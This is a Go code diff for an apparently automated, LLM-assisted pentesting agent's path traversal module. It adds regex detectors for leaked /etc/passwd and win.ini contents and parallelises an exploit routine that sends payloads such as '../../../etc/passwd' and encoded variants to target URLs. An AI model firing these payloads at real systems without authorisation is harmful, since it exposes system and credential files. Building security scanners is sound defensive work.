@@ -12,8 +12,10 @@ import (
 	"fmt"
 	"log"
 	"net/url"
+	"regexp"
 	"runtime/debug"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -126,6 +128,12 @@ func (p *PathTraversalSpecialist) replaceLocalhostForDocker(targetURL string) st
 }
 
 func (p *PathTraversalSpecialist) analyzeForPathTraversal(httpResponse string) string {
+	// OPTIMIZATION: Pattern matching first (skip LLM if clear path traversal patterns found)
+	if patternResult := p.patternMatchPathTraversal(httpResponse); patternResult != "" {
+		log.Printf("[%s] Pattern match found Path Traversal indicators, skipping LLM\n", p.id)
+		return patternResult
+	}
+
 	// Limit response size for LLM
 	responseToAnalyze := httpResponse
 	if len(httpResponse) > 4000 {
@@ -141,6 +149,81 @@ func (p *PathTraversalSpecialist) analyzeForPathTraversal(httpResponse string) s
 	}
 
 	return analysis
+}
+
+// patternMatchPathTraversal performs fast pattern matching for Path Traversal indicators
+func (p *PathTraversalSpecialist) patternMatchPathTraversal(httpResponse string) string {
+	// File content patterns indicating successful traversal
+	fileContentPatterns := []*regexp.Regexp{
+		regexp.MustCompile(`root:.*:0:0:`),                        // /etc/passwd
+		regexp.MustCompile(`(?i)\[boot loader\]`),                 // boot.ini
+		regexp.MustCompile(`(?i)\[fonts\]`),                       // win.ini
+		regexp.MustCompile(`daemon:.*:1:1:`),                      // /etc/passwd
+		regexp.MustCompile(`nobody:.*:65534:`),                    // /etc/passwd
+		regexp.MustCompile(`(?i)windows.*system32`),               // Windows path
+		regexp.MustCompile(`(?i)c:\\windows`),                     // Windows path
+		regexp.MustCompile(`/usr/sbin/nologin`),                   // /etc/passwd shell
+	}
+
+	// Error patterns indicating file inclusion attempt
+	errorPatterns := []*regexp.Regexp{
+		regexp.MustCompile(`(?i)failed to open stream`),           // PHP file error
+		regexp.MustCompile(`(?i)include.*failed opening`),         // PHP include error
+		regexp.MustCompile(`(?i)no such file or directory`),       // Linux error
+		regexp.MustCompile(`(?i)permission denied`),               // Access denied
+		regexp.MustCompile(`(?i)cannot find the path`),            // Windows error
+	}
+
+	// Check if sensitive file contents are already visible
+	for _, pattern := range fileContentPatterns {
+		if match := pattern.FindString(httpResponse); match != "" {
+			// Truncate match for logging
+			matchPreview := match
+			if len(match) > 50 {
+				matchPreview = match[:50]
+			}
+			log.Printf("[%s] Sensitive file content detected: %s\n", p.id, matchPreview)
+			result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
+			result += fmt.Sprintf("- LOCATION: %s\n", p.target)
+			result += "- VULNERABLE PARAMETER: file (detected from content)\n"
+			result += "- CONFIDENCE: High (File content detected)\n"
+			result += "- REASONING: Sensitive file content found in response\n"
+			result += "- SUGGESTED PAYLOAD: ../../../etc/passwd\n"
+			return result
+		}
+	}
+
+	// Check for file operation errors (potential but not confirmed)
+	for _, pattern := range errorPatterns {
+		if match := pattern.FindString(httpResponse); match != "" {
+			log.Printf("[%s] File operation error detected: %s\n", p.id, match)
+			// Don't return - this indicates file param exists but needs testing
+		}
+	}
+
+	// Check for file-related parameters in forms/links
+	fileParamPatterns := []*regexp.Regexp{
+		regexp.MustCompile(`name=["']?(file|path|doc|document|page|include|src|source|filename|filepath)["']?`),
+		regexp.MustCompile(`\?(file|path|doc|document|page|include|src|source|filename|filepath)=`),
+	}
+
+	for _, pattern := range fileParamPatterns {
+		if match := pattern.FindStringSubmatch(httpResponse); len(match) > 0 {
+			paramName := "file"
+			if len(match) > 1 {
+				paramName = match[1]
+			}
+			result := "VULNERABILITY CANDIDATE FOUND: Yes\n"
+			result += fmt.Sprintf("- LOCATION: %s\n", p.target)
+			result += fmt.Sprintf("- VULNERABLE PARAMETER: %s\n", paramName)
+			result += "- CONFIDENCE: Medium (Pattern-based detection)\n"
+			result += "- REASONING: File-related parameter detected\n"
+			result += "- SUGGESTED PAYLOAD: ../../../etc/passwd\n"
+			return result
+		}
+	}
+
+	return "" // Fallback to LLM
 }
 
 func (p *PathTraversalSpecialist) generateReport(httpResponse string, analysis string) string {
@@ -221,7 +304,15 @@ func (p *PathTraversalSpecialist) reportCandidateIfFound(analysis string) {
 	p.bus.Publish("Reporter-01", event)
 }
 
-// exploitPathTraversal attempts to exploit Path Traversal by reading sensitive files
+// PTResult holds the result of a single path traversal payload test
+type PTResult struct {
+	Payload   string
+	Platform  string
+	Signature string
+	Success   bool
+}
+
+// exploitPathTraversal attempts to exploit Path Traversal by reading sensitive files (PARALLEL)
 func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter string) (bool, string) {
 	// Common path traversal payloads with target files
 	type payloadTest struct {
@@ -231,46 +322,48 @@ func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter stri
 	}
 
 	tests := []payloadTest{
-		// Linux/Unix
+		// Linux/Unix (most common first)
 		{"../../../etc/passwd", "root:", "Linux"},
 		{"../../../../etc/passwd", "root:", "Linux"},
 		{"../../../../../etc/passwd", "root:", "Linux"},
-		{"../../../../../../etc/passwd", "root:", "Linux"},
-		{"../../../etc/shadow", "root:", "Linux"},
 
 		// Windows
 		{"../../../windows/win.ini", "[fonts]", "Windows"},
 		{"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows"},
-		{"../../../boot.ini", "[boot loader]", "Windows"},
-		{"..\\..\\..\\boot.ini", "[boot loader]", "Windows"},
 
 		// Alternative encodings
 		{"..%2f..%2f..%2fetc%2fpasswd", "root:", "Linux"},
-		{"..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "Windows"},
 	}
 
+	// Parallel testing
+	results := make(chan PTResult, len(tests))
+	var wg sync.WaitGroup
+
 	for _, test := range tests {
-		// Construct test URL with payload
-		testURL, err := p.injectPayload(targetURL, parameter, test.payload)
-		if err != nil {
-			log.Printf("[%s] Failed to construct test URL: %v\n", p.id, err)
-			continue
-		}
+		wg.Add(1)
+		go func(t payloadTest) {
+			defer wg.Done()
+			success := p.testSinglePTPayload(targetURL, parameter, t.payload, t.signature)
+			results <- PTResult{
+				Payload:   t.payload,
+				Platform:  t.platform,
+				Signature: t.signature,
+				Success:   success,
+			}
+		}(test)
+	}
 
-		// Replace localhost for Docker
-		dockerURL := p.replaceLocalhostForDocker(testURL)
+	// Close results channel when all goroutines complete
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
 
-		// Send HTTP request
-		response, err := tools.SimpleHTTPGet(p.ctx, p.executor, dockerURL)
-		if err != nil {
-			log.Printf("[%s] HTTP request failed for payload test: %v\n", p.id, err)
-			continue
-		}
-
-		// Check if signature is present in response
-		if strings.Contains(response, test.signature) {
+	// Check results - return on first success
+	for result := range results {
+		if result.Success {
 			evidence := fmt.Sprintf("Path Traversal verified on %s system. Payload: %s, Signature found: %s",
-				test.platform, test.payload, test.signature)
+				result.Platform, result.Payload, result.Signature)
 			log.Printf("[%s] ✅ PATH TRAVERSAL VERIFIED: %s\n", p.id, evidence)
 			return true, evidence
 		}
@@ -278,6 +371,29 @@ func (p *PathTraversalSpecialist) exploitPathTraversal(targetURL, parameter stri
 
 	log.Printf("[%s] ❌ Path Traversal exploitation failed: No sensitive file content detected\n", p.id)
 	return false, ""
+}
+
+// testSinglePTPayload tests a single path traversal payload
+func (p *PathTraversalSpecialist) testSinglePTPayload(targetURL, parameter, payload, signature string) bool {
+	// Construct test URL with payload
+	testURL, err := p.injectPayload(targetURL, parameter, payload)
+	if err != nil {
+		log.Printf("[%s] Failed to construct test URL: %v\n", p.id, err)
+		return false
+	}
+
+	// Replace localhost for Docker
+	dockerURL := p.replaceLocalhostForDocker(testURL)
+
+	// Send HTTP request
+	response, err := tools.SimpleHTTPGet(p.ctx, p.executor, dockerURL)
+	if err != nil {
+		log.Printf("[%s] HTTP request failed for payload test: %v\n", p.id, err)
+		return false
+	}
+
+	// Check if signature is present in response
+	return strings.Contains(response, signature)
 }
 
 // injectPayload injects the path traversal payload into the target URL parameter
